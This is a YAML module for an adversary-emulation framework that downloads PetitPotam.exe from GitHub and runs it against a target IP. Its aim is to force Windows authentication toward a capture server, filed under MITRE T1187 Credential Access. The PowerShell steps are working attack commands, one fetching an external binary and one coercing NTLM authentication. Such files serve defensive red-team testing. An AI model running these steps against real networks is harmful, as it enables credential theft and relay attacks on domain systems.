api_version: "2.0"
name: PetitPotam
description: |
    This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.
args:
    - name: targetServerIP
      type: string
      default: 10.0.0.2
    - name: efsApi
      type: int
      default: "1"
    - name: petitpotam_path
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\PetitPotam.exe
    - name: captureServerIP
      type: string
      default: 10.0.0.3
uuid: 485ce873-2e65-4706-9c7e-ae3ab9e14213
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1187: Forced Authentication'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        PetitPotam binary must exist on disk and at specified location (#{petitpotam_path}).
        And the computer must be domain joined (implicit authentication).
      inline: |
        if (Test-Path "#{petitpotam_path}") { exit 0 } else { {New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        Invoke-WebRequest "https://github.com/topotam/PetitPotam/blob/2ae559f938e67d0cd59c5afcaac67672b9ef2981/PetitPotam.exe?raw=true" -OutFile "#{petitpotam_path}"
        } }
      executor: powershell
    - name: petitpotam
      inline: |
        & "{{.Args.petitpotam_path}}" {{.Args.captureServerIP}} {{.Args.targetServerIP}} {{.Args.efsApi}}
        Write-Host "End of PetitPotam attack"
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
